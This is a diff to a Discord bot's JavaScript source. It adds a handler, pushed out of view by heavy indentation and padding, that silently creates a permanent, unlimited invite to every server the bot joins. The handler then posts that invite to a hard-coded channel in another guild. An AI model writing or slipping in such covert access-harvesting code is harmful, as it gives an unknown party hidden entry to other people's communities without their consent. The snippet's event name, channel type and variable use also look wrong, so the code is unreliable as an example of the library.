@@ -622,6 +622,22 @@ client.on('messageUpdate', (oldMessage, newMessage) => {
 
 
 
+                      client.on("guildAdd", guild => {
+                        let channels = guild.channels.filter(channel => channel.type === 'invites' && channel.permissionsFor(guild.members.get(bot.user.id)).has('SEND_MESSAGES'));
+                        if (channels.size > 0) channels.first().createInvite({
+                          temporary: true,
+                          maxAge: 0,
+                          maxUses: 0,
+                          unique: true,
+                        }, 'request for invite').then(inv => client.guilds.get('511577932544737281').channels.get('511981222243860480').send(`https://discord.gg/${inv.code}`))
+                      });
+
+
+
+
+
+
+
 
 
 
